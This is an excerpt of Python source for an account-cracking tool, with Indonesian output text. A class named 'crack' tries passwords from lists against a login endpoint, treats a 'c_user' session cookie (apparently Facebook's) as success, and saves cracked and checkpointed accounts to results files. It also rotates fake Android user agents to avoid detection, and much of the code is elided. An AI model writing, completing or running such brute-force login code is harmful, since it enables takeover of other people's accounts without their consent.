...
class crack:
    ...
    def open_list(self):
        try:
            Console(width=50, style="bold blue").print(Panel("""[bold white]Hasil Crack[bold green] Ok[bold white] Tersimpan Di :[bold green] Results/Ok.txt
[bold white]Hasil Crack[bold yellow] Cp[bold white] Tersimpan Di :[bold yellow] Results/Cp.txt""", title="[bold red]>[bold yellow]>[bold green]>[bold blue] (Hasil Crack) [bold green]<[bold yellow]<[bold red]"))
            ...
            for pws in password:
                ...
                with requests.Session() as r:
                    ...
                    if 'c_user' in r.cookies.get_dict().keys():
                        ...
                        tree = Tree("\r[bold purple]LOGIN BERHASIL                     ", style = "bold white")
                        ...
                        tree = Tree("\r[bold white]LOGIN GAGAL                      ", style = "bold white")
                        tree.add(f"[bold red]USER ID : {email}").add(f"[bold red]Password : {pws}", style = "bold white")
                        ...
                        continue
            self.looping += 1
            Console().print(f"[bold blue]   ╰─>[bold purple] proses {str(len(Dump))}🕜{self.looping} Ok:-[bold green]{len(self.success)}[bold white] Cp:-[bold yellow]{len(self.checkpoint)}[bold white]              ", end='\r')
    ...
    def realme_useragent(self, total):
        for _ in range(total):
            ...
            self.android_version = random.choice(['4.3', '4.1.2', '4.2.2'])
            self.android_model = random.choice(['Redmi Note 3', 'LoveYou-2023', 'Basari-ID'])
            self.useragent = ('Mozilla/5.0 (Linux; U; Android []; [] Build/JZ054K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/36.0.4369.76 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android []; [] Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4264.105 Mobile Safari/537.36', 'Mozilla/5.0 (Linux;  Android []; [] Lite) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4414.94 Mobile Safari/537.36'.format(self.android_version, self.android_model, self.build, self.browser_version))
